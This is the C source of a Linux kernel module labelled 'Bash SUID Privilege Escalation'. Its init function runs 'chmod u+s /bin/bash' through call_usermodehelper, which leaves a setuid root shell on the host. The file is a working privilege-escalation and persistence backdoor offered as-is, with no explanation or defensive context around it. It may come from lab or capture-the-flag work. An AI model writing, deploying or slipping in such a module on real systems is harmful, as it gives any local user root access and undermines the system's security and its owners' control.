#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kmod.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("D3VIL");
MODULE_DESCRIPTION("Bash SUID Privilege Escalation");

static int run_command(void) {
    char *argv[] = { "/bin/sh", "-c", "chmod u+s /bin/bash", NULL };
    static char *envp[] = { "HOME=/", "TERM=xterm", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static int __init exploit_init(void) {
    printk(KERN_INFO "Loading module...\n");
    run_command(); 
    return 0;
}

static void __exit exploit_exit(void) {
    printk(KERN_INFO "Module removed.\n");
}

module_init(exploit_init);
module_exit(exploit_exit);
